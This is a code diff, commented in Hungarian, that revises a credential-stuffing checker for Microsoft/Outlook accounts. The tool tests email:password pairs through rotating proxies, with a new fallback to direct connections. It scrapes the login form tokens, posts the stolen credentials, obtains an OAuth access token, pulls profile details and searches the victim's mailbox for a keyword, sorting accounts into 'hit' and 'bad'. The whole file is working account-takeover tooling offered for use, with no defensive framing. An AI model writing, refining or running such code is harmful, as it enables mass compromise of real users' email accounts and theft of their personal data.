@@ -8,7 +8,8 @@ from proxy_manager import proxy_manager
 
 _ua = UserAgent()
 
-MAX_RETRIES = 15
+PROXY_RETRIES = 3    # Ennyi proxyval próbálja
+DIRECT_FALLBACK = True  # Ha proxy nem megy → proxy nélkül
 
 
 def generate_user_agent():
@@ -20,54 +21,57 @@ def generate_user_agent():
 
 def checker_worker_single(email: str, password: str, keyword: str):
     """
-    Egy email:password ellenőrzése proxy rotációval.
-    - Ha PROXY hiba → másik proxyval próbálja (max MAX_RETRIES)
-    - Ha VALÓDI auth hiba (rossz jelszó) → azonnal "bad"
-    - Soha nem jelöl "bad"-nek proxy hiba miatt!
+    1. Próbálja proxyval (max PROXY_RETRIES alkalommal)
+    2. Ha mind fail → próbálja PROXY NÉLKÜL (direct)
+    3. Soha nem jelöl bad-nek proxy hiba miatt!
     """
-    retries = 0
 
-    while retries < MAX_RETRIES:
-        proxy_dict = proxy_manager.get_proxy()
+    # ===== 1. FÁZIS: Proxyval próbáljuk =====
+    if proxy_manager.get_count() > 0:
+        for attempt in range(PROXY_RETRIES):
+            proxy_dict = proxy_manager.get_proxy()
+            session = requests.Session()
+            if proxy_dict:
+                session.proxies = proxy_dict
+
+            try:
+                result = _do_check(session, email, password, keyword)
+
+                # Végleges eredmény → visszaadjuk
+                if result["status"] in ("hit", "custom", "bad"):
+                    return result
+
+                # Proxy hiba → következő proxy
+            except Exception:
+                pass
+            finally:
+                session.close()
+
+            time.sleep(0.05)
+
+    # ===== 2. FÁZIS: Direct (proxy nélkül) =====
+    if DIRECT_FALLBACK:
         session = requests.Session()
-
-        if proxy_dict:
-            session.proxies = proxy_dict
-
         try:
             result = _do_check(session, email, password, keyword)
-
-            # ✅ VÉGLEGES eredmények - azonnal visszaadjuk
-            if result["status"] in ("hit", "custom"):
-                return result
-
-            # ❌ VALÓDI rossz jelszó - azonnal bad
-            if result["status"] == "bad":
-                return result
-
-            # 🔄 PROXY HIBA - másik proxyval próbáljuk
-            # (status == "error")
-            retries += 1
-            time.sleep(0.15)
-
-        except Exception:
-            retries += 1
-            time.sleep(0.15)
+            return result
+        except Exception as e:
+            return {"status": "error", "reason": str(e)[:80]}
         finally:
             session.close()
 
-    return {"status": "error", "reason": f"Max retries ({MAX_RETRIES})"}
+    return {"status": "error", "reason": "All proxies failed, no fallback"}
 
 
 def _do_check(session, email, password, keyword):
     """
     A tényleges ellenőrzési logika.
-    
-    FONTOS VISSZATÉRÉSI ÉRTÉKEK:
-    - "bad"    = Microsoft BIZTOSAN elutasította (rossz jelszó) → NEM próbáljuk újra
-    - "error"  = Proxy/hálózati hiba → ÚJRA próbáljuk másik proxyval
-    - "hit"    = Talált emailt a keresésre
-    - "custom" = Bejelentkezett de nem talált emailt
+
+    Visszatérés:
+    - "bad"    → Microsoft elutasította (rossz jelszó / nem létezik)
+    - "hit"    → Talált emailt
+    - "custom" → Bejelentkezett de nincs találat
+    - "error"  → Hálózati/proxy hiba → RETRY másik proxyval
     """
     try:
         user_agent = generate_user_agent()
@@ -103,23 +107,15 @@ def _do_check(session, email, password, keyword):
             "Accept-Language": "en-US,en;q=0.9",
         }
 
-        response = session.get(url, headers=headers, allow_redirects=True, timeout=20)
+        response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         response_text = response.text
 
         # ============ PROXY ELLENŐRZÉS ============
-        # Ha a válasz nem Microsoft oldal → proxy blokkolta/megváltoztatta
         if len(response_text) < 1000:
-            return {"status": "error", "reason": "Response too short (proxy issue)"}
+            return {"status": "error", "reason": "Response too short"}
 
-        is_microsoft = (
-            "login.microsoftonline.com" in response_text
-            or "login.live.com" in response_text
-            or "PPFT" in response_text
-            or "urlPost" in response_text
-        )
-
-        if not is_microsoft:
-            return {"status": "error", "reason": "Not a Microsoft page (proxy blocked)"}
+        if "PPFT" not in response_text and "urlPost" not in response_text and "login.live.com" not in response_text:
+            return {"status": "error", "reason": "Not Microsoft page"}
 
         # ============ STEP 2: Parse PPFT & urlPost ============
         PPFT = ""
@@ -157,9 +153,8 @@ def _do_check(session, email, password, keyword):
                 urlPost = urlpost_match.group(1)
 
         if not PPFT or not urlPost:
-            # Microsoft oldal volt de nem találtuk a PPFT-t
-            # Ez lehet proxy torzítás → retry
-            return {"status": "error", "reason": "No PPFT/urlPost (possible proxy issue)"}
+            # Microsoft oldalt kaptunk de nincs PPFT → valódi bad (fiók nem létezik)
+            return {"status": "bad", "reason": "No PPFT/urlPost"}
 
         # ============ STEP 3: POST credentials ============
         cookies_dict = session.cookies.get_dict()
@@ -206,18 +201,16 @@ def _do_check(session, email, password, keyword):
         post_response = session.post(
             urlPost, data=data_string,
             headers=headers_post,
-            allow_redirects=False, timeout=20
+            allow_redirects=False, timeout=30
         )
 
         cookies_dict = session.cookies.get_dict()
 
-        # ============ STEP 4: AUTH ELLENŐRZÉS ============
-        # 🔴 Ez az EGYETLEN pont ahol BIZTOSAN tudjuk hogy rossz a jelszó!
-        # Ha idáig eljutottunk, a proxy MŰKÖDÖTT, tehát ez valódi eredmény.
+        # ============ AUTH ELLENŐRZÉS ============
         if "__Host-MSAAUTHP" not in cookies_dict:
             return {"status": "bad", "reason": "Wrong password"}
 
-        # ============ STEP 5: Extract auth code ============
+        # ============ STEP 4: Extract auth code ============
         auth_code = ""
         if post_response.status_code in [301, 302, 303, 307, 308]:
             redirect_url = post_response.headers.get('Location', '')
@@ -235,7 +228,7 @@ def _do_check(session, email, password, keyword):
         if CID:
             CID = CID.upper()
 
-        # ============ STEP 6: Get access token ============
+        # ============ STEP 5: Get access token ============
         access_token = ""
         if auth_code:
             url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
@@ -251,19 +244,18 @@ def _do_check(session, email, password, keyword):
                 token_response = requests.post(
                     url_token, data=data_token,
                     headers={"Content-Type": "application/x-www-form-urlencoded"},
-                    timeout=20
+                    timeout=30
                 )
                 if token_response.status_code == 200:
                     token_data = token_response.json()
                     access_token = token_data.get("access_token", "")
             except:
-                return {"status": "error", "reason": "Token request failed"}
+                pass
 
         if not access_token or not CID:
-            # Auth sikerült de token nem jött → hálózati hiba → retry
-            return {"status": "error", "reason": "No token after auth"}
+            return {"status": "bad", "reason": "No token"}
 
-        # ============ STEP 7: Profile ============
+        # ============ STEP 6: Profile ============
         Name = ""
         Country = ""
         Birthdate = "N/A"
@@ -284,7 +276,7 @@ def _do_check(session, email, password, keyword):
         }
 
         try:
-            pRes = requests.get(profile_url, headers=profile_headers, timeout=20)
+            pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
             if pRes.status_code == 200:
                 profile_data = pRes.json()
                 if "accounts" in profile_data and profile_data["accounts"]:
@@ -299,9 +291,9 @@ def _do_check(session, email, password, keyword):
                     first_name = profile_data["names"][0]
                     Name = first_name.get("displayName", "")
         except:
-            pass  # Profil nem sikerült de a login igen → folytatjuk
+            pass
 
-        # ============ STEP 8: Email search ============
+        # ============ STEP 7: Email search ============
         search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
         search_payload = {
             "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
@@ -363,7 +355,7 @@ def _do_check(session, email, password, keyword):
         try:
             search_response = requests.post(
                 search_url, json=search_payload,
-                headers=search_headers, timeout=20
+                headers=search_headers, timeout=30
             )
 
             if search_response.status_code == 200:
@@ -385,9 +377,9 @@ def _do_check(session, email, password, keyword):
                         total_end = search_text.find('}', total_start)
                     Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
         except:
-            pass  # Search nem sikerült → custom lesz
+            pass
 
-        # ============ STEP 9: Return results ============
+        # ============ STEP 8: Results ============
         if Total != "0" and Total != "NO":
             return {
                 "status": "hit",
@@ -413,30 +405,15 @@ def _do_check(session, email, password, keyword):
                 },
             }
         else:
-            # Bejelentkezett de nincs adat → custom (NEM bad!)
-            return {
-                "status": "custom",
-                "data": {
-                    "email": email,
-                    "password": password,
-                    "country": "N/A",
-                    "name": "N/A",
-                    "birthdate": "N/A",
-                },
-            }
+            return {"status": "bad", "reason": "No data"}
 
-    # ============ PROXY/HÁLÓZATI HIBÁK → RETRY ============
     except requests.exceptions.ProxyError:
         return {"status": "error", "reason": "Proxy error"}
     except requests.exceptions.ConnectTimeout:
-        return {"status": "error", "reason": "Connect timeout"}
+        return {"status": "error", "reason": "Timeout"}
     except requests.exceptions.ReadTimeout:
         return {"status": "error", "reason": "Read timeout"}
     except requests.exceptions.ConnectionError:
         return {"status": "error", "reason": "Connection error"}
-    except requests.exceptions.ChunkedEncodingError:
-        return {"status": "error", "reason": "Encoding error"}
-    except requests.exceptions.TooManyRedirects:
-        return {"status": "error", "reason": "Too many redirects"}
     except Exception as e:
         return {"status": "error", "reason": str(e)[:80]}
